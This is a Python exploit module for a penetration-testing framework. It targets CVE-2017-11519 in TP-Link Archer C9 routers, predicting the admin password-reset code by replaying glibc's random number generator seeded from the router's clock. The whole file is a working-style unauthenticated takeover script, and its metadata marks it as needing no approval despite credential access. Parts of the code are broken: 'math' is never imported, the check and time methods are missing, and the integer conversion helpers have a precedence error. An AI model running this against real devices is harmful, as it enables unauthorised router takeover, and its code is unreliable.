#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TP-Link Archer C9 admin password reset (CVE-2017-11519)"""

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'TP-Link Archer C9 admin password reset (CVE-2017-11519)',
        'description': 'Module exploits TP-Link Archer C9 password reset feature by leveraging a predictable random number generator seed.',
        'author': ['William Bowling (wbowling.info)', 'Vadim Yanitskiy'],
        'cve': ['CVE-2017-11519'],
        'platform': Platform.LINUX,
        'references': ['https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11519'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'cve-2017-11519', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    RAND_MAX = 0x7fffffff
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def get_time(self) -> int:
        print_status("Getting current time at the target")

        response = self.http_request(
            method="GET",
            path="/",
        )

        if response is None:
            raise ExploitError
        if response.status_code != 200:
            raise ExploitError
        if "Date" not in response.headers:
            raise ExploitError

        import email.utils as eu

        date = response.headers["Date"]
        return eu.mktime_tz(eu.parsedate_tz(date))
    def gen_reset_code(self):
        print_status("Generating reset code at the target")

        response = self.http_request(
            method="POST",
            path="/cgi-bin/luci/;stok=/login?form=vercode",
            data={"operation": "read"},
        )

        if response is None:
            raise ExploitError
        if response.status_code != 200:
            raise ExploitError
    def try_reset_code(self, seed: int) -> bool:
        code = self.get_random(seed, 100000, 999999)
        print_status("Trying code %d (seed %d)" % (code, seed))

        response = self.http_request(
            method="POST",
            path="/cgi-bin/luci/;stok=/login?form=vercode",
            data={"operation": "write", "vercode": code},
        )

        if response is None:
            raise ExploitError
        if response.status_code != 200:
            raise ExploitError

        return response.json()["success"]
    def guess_reset_code(self, time: int):
        print_status("Guessing reset code")

        for seed in range(time, time + 5):
            if self.try_reset_code(seed):
                print_success("admin's password has been reset!")
                return
        print_error("Could not guess the reset code")
    def glibc_prng(self, seed: int):
        def int32(x: int) -> int:
            if x & 0xffffffff > 0x7fffffff:
                return x & 0xffffffff - 0x100000000
            else:
                return x & 0xffffffff

        def int64(x: int) -> int:
            if x & 0xffffffffffffffff > 0x7fffffffffffffff:
                return x & 0xffffffffffffffff - 0x10000000000000000
            else:
                return x & 0xffffffffffffffff

        r = [0] * 344
        r[0] = seed

        for i in range(1, 31):
            r[i] = int32(int64(16807 * r[i - 1]) % 0x7fffffff)
            if r[i] < 0:
                r[i] = int32(r[i] + 0x7fffffff)
        for i in range(31, 34):
            r[i] = int32(r[i - 31])
        for i in range(34, 344):
            r[i] = int32(r[i - 31] + r[i - 3])

        i = 344 - 1

        while True:
            i += 1
            r.append(int32(r[i - 31] + r[i - 3]))
            yield int32((r[i] & 0xffffffff) >> 1)
    def get_random(self, seed: int, t: int, u: int) -> int:
        prng = self.glibc_prng(seed)
        r = float(next(prng)) % self.RAND_MAX / self.RAND_MAX
        return int(math.floor(r * (u - t + 1)) + t)
    def check(self) -> bool:
        return self._check()
    def run(self):
        if self._check():
            self.guess_reset_code(self.time)
        else:
            print_error("Device seems to be not vulnerable")
